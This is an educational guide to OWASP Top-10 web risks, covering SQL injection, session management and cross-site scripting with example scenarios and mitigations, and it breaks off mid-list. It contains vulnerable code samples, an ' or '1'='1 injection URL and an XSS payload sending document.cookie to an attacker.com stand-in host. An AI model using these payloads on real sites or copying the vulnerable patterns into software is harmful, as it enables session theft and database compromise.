# Critical Security Areas
In this guide will talk about why Web security is so important and will understand primary risks that exposes website to attackers. [Daily DDos attacks](http://www.digitalattackmap.com/#anim=1&color=0&country=ALL&list=0&time=17033&view=map). Will look into OWASP Top-10 security risks and preventive measures to mitigate attacks.

### About OWASP

The __Open Web Application Security Project__ (OWASP) is a _non-profit_ educational
charity dedicated to enabling organizations to design, develop, acquire, operate, and maintain
secure software.[OWASP-Org](https://www.owasp.org)

OWASP is not affiliated with any technology company. Similar to many open­source software projects, OWASP produces many types of materials in a collaborative and open way. All OWASP tools, documents, forums, and chapters are free and open to
anyone interested in improving application security.

### Introduction to Websecurity risk

![description](https://raw.githubusercontent.com/pluralsight/guides/master/images/2bb93931-db94-4cf4-ac6d-82eb3dd560f4.jpg)

Websites and Web-Servers are prone to security risks and [threats](https://en.wikipedia.org/wiki/Web_threat) due to insecure software and lack of security principles. In recent years a range of different companies have suffered online attacks, including finance, defense, healthcare and other critical organisations worldwide. [Live Online-attacks](http://map.norsecorp.com/#/)

The goal of the OWASP  is to raise awareness about web application security by describing the most important areas of concern that software developers must be aware of.




### What are the [Top-10](https://www.owasp.org/index.php/Top_10_2013-Top_10) Vulnerablities ?

1. SQL-Injection
2. Broken Authentication and Session Management
3. Cross-Site Scripting (XSS)
4. Insecure Direct Object References
5. Security Misconfiguration
6. Sensitive Data Exposure
7. Missing Function Level Access Control
8. Cross-Site Request Forgery (CSRF)
9. Using Components with Known Vulnerabilities
10. Unvalidated Redirects and Forwards

We will cover each and every risk in detail below.

### __1. SQL-Injection__


![description](https://raw.githubusercontent.com/pluralsight/guides/master/images/c73b8611-3b98-4932-a81a-eedfa0fcaa05.png)


SQL injection (SQLi) refers to an injection attack wherein an attacker can execute malicious SQL statements (_malicious payload_) that control a web application's database server.

A successful SQL injection can read sensitive data from the database, modify database, execute administration operations on the database (such as shutdown the DBMS), recover the content of a given file present on the DBMS file system and in some cases can issue commands to the operating system.


Exploitability | Prevalence | Detectability | Impact
------------------- | -------------------- | ------------
EASY | COMMON   | AVERAGE |SEVERE

**Example Scenario :**
The application uses untrusted data in the construction of the following vulnerable SQL call:
```
String query = "SELECT * FROM accounts WHERE custID='" + request.getParameter("id") + "'";
```
In this case the attacker modifies the ‘id’ parameter value in browser to send `' '` or `'1'='1`
For ex :
```
http://example.com/app/accountView?id=' or '1'='1
```
This changes the meaning of both query to return all the records from the accounts table.

**Preventive Measures **
1. Keep untrusted data separate from commands and queries..
2. Use a safe API which avoids the use of the interpreter entirely or provides a parameterized interface.
3. If a parameterized API is not available, you should carefully escape special characters using the specific escape syntax for that interpreter.


### **2. Broken Authentication and Session Management**


![description](https://raw.githubusercontent.com/pluralsight/guides/master/images/a6b69ff8-4d55-4d65-b775-ac987112de7a.png)


Application functions related to authentication and session management are often not implemented correctly. This allows attackers to compromise passwords, keys, or session tokens.

These kinds of flaws can be extremely serious in web applications and put businesses at a very high risk to not only lose confidential data but to open back doors to the entire company to maliscious attackers. 

Exploitability | Prevalence | Detectability | Impact
------------------- | -------------------- | ------------
AVERAGE | WIDESPREAD   | AVERAGE |SEVERE

**Example scenario** :  Session timeouts aren’t set properly. User uses a public computer to access site. Instead of selecting _“logout”_ the user simply closes the browser tab and walks away. Attacker can use the same browser an hour later, and that browser is still authenticated.

**Preventive Measures **
1. A single set of strong authentication and session management controls should be implemented.
2. Strong efforts should also be made to avoid XSS flaws which can be used to steal session IDs.
3. Proper application session timeout should be implemented.
4. Consider the [ESAPI Authenticator and User APIs](http://owasp-esapi-java.googlecode.com/svn/trunk_doc/latest/org/owasp/esapi/Authenticator.html) as good examples.


### **3. Cross-Site Scripting (XSS)**

![description](https://raw.githubusercontent.com/pluralsight/guides/master/images/cf94e0ae-5a50-4830-9d44-66ffe0cdcfff.png)


Cross-site scripting flaws occur whenever an application takes untrusted data and sends it to a web browser without proper validation or escaping. XSS allows attackers to execute scripts in the victim’s browser which can hijack user sessions, deface web sites, or redirect the user to malicious sites.


Exploitability | Prevalence | Detectability | Impact
------------------- | -------------------- | ------------
AVERAGE | VERY WIDESPREAD   | EASY | MODERATE

**Example scenario** : The application uses untrusted data in the construction of the following HTML snippet without validation or escaping
```
(String) page += "<input name='creditcard' type='TEXT' value='" + request.getParameter("CC") + "'>";
```
The attacker modifies the 'CC' parameter in their browser to:
```
'><script>document.location= 'http://www.attacker.com/cgi-bin/cookie.cgi ?foo='+document.cookie</script>'.
```
This causes the victim’s session ID to be sent to the attacker’s website, allowing the attacker to hijack the user’s current session.


**Preventive Measures **

1. 




















